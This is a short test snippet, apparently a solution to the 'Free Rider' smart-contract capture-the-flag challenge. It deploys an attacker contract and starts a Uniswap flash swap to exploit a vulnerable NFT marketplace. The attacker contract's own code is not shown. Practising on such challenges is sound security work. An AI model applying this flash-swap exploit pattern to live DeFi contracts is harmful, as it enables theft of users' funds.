...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        const freeRiderAttacker = await (await ethers.getContractFactory('FreeRiderAttacker', attacker)).deploy(
            this.weth.address, this.marketplace.address, this.buyerContract.address, this.uniswapPair.address, this.nft.address,
            { value: ethers.utils.parseEther("0.45") }
        );

        await this.uniswapPair.connect(attacker).swap(ethers.utils.parseEther("15"), 0, freeRiderAttacker.address, "0x11", { gasLimit: 1e6 })
    });
